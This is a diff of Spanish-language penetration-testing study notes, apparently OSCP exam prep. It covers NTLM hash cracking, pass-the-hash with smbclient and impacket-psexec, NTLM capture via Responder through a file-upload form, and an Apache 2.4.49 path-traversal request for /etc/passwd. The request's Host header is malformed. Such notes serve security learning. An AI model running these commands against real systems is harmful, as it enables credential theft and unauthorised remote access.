@@ -83,7 +83,7 @@
 
 Una vez tenemos el hash, buscamos en hashcat el modo de crackeo:
 
-![image](https://github.com/loqasto/OSCP/assets/111526713/f9b028e5-0d0e-4e5a-a8f0-1156c3ac3d84)
+  ![image](https://github.com/loqasto/OSCP/assets/111526713/f9b028e5-0d0e-4e5a-a8f0-1156c3ac3d84)
 
 En este caso, el modo es 1000, por lo tanto:
 
@@ -93,19 +93,39 @@ Y obtenemos la contraseña en texto plano.
 
 ### PassTheHash
 
-  Conectar a compartido por smbclient con PtH:
+Conectar a compartido por smbclient con PtH:
 
     smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
 
-  Obtener shell con psexec a través de PtH:
+Obtener shell con psexec a través de PtH:
 
     impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
 
+Obtener hash NTLM desde un formulario de carga de archivos:
 
+  Tenemos el formulario de carga:
+
+  ![image](https://github.com/loqasto/OSCP/assets/111526713/0e8305d9-b2f8-40d4-a58f-333a4e4df9fa)
+
+  Subimos un fichero cualquiera y capturamos la petición con BurpSuite:
+
+  ![image](https://github.com/loqasto/OSCP/assets/111526713/162f3a70-59bb-42ff-8ec3-e12e82d2307a)
+
+  Nos ponemos en escucha con responder por la interfaz correspondiente:
+
+    └─# responder -I tun0
+
+  Enviamos la siguiente petición:
+
+  ![image](https://github.com/loqasto/OSCP/assets/111526713/0a6aea7c-89ef-4cb9-a936-f6ae8fff365f)
+
+  Y recibimos el hash:
+
+  ![image](https://github.com/loqasto/OSCP/assets/111526713/05039fb0-22bc-42d3-83a7-a30f7bd9111e)
 
 ## Vulnerabilidades conocidas
 
-  Apache HTTP Server 2.4.49 - Path traversal
+Apache HTTP Server 2.4.49 - Path traversal
 
     GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
     Host: https://www.twitter.com/vulnmachines
